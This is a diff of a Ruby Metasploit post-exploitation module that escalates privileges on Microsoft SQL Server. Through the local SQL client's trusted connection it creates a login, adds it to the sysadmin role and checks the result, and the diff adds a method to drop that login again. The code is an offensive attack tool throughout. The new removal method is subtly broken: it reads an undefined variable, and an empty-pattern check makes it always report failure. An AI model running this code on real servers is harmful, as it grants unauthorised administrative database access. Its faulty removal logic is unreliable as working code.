@@ -152,7 +152,7 @@ class Metasploit3 < Msf::Post
 		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
 		print_status(" o User: #{dbuser}") if verbose == "true" 
 		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
-		print_status("Running #{sqlclient} command:") if verbose == "true" 
+		print_status("Command:") if verbose == "true" 
 		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\"") if verbose == "true" 
 		
 		# Get Data
@@ -193,18 +193,18 @@ class Metasploit3 < Msf::Post
 		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
 		print_status(" o User: #{dbuser}") if verbose == "true" 
 		print_status(" o Password:  #{dbpass}") if verbose == "true"  
-		print_status("Running #{sqlclient} command:")  if verbose == "true" 
+		print_status("Command:")  if verbose == "true" 
 		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \"") if verbose == "true" 
 		
 		# Get Data
-		add_login_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \"")
+		add_sysadmin_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \"")
 		
 		# Parse Data 
-		add_login_array = add_login_result.split("\n")
+		add_sysadmin_array = add_sysadmin_result.split("\n")
 		
 		# Check for success
 		check = 0
-		add_login_array.each do |service|
+		add_sysadmin_array.each do |service|
 			if service =~ /bingo/ then
 					check = 1
 			end
@@ -223,6 +223,46 @@ class Metasploit3 < Msf::Post
 			return 0
 			
 		end
+	end
+	
+	# Method for removing login
+	def remove_sql_login(sqlclient,dbuser,verbose)
+		
+		# Display debugging information
+		print_status("Settings:") if verbose == "true" 
+		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
+		print_status(" o User: #{dbuser}") if verbose == "true" 			
+		print_status("Command:") if verbose == "true" 
+		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\"") if verbose == "true" 
+		
+		# Get Data
+		remove_login_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\"")
+		
+		# Parse Data 
+		add_remove_array = add_remove_result.split("\n")
+		
+		# Check for success
+		check = 0
+		add_remove_array.each do |service|
+			if service =~ // then
+					check = 1
+			end
+		end	
+		
+		if check == 0	
+		
+			print_good("Successfully removed login \"#{dbuser}\"")	
+			return 1
+			
+		else 
+		
+			# Fail
+			print_error("Unabled to remove login #{dbuser}")
+			print_error("Database Error:\n #{add_login_result}")
+			return 0
+			
+		end
+
 	end
 		
 	# Method for executing cmd and returning the response
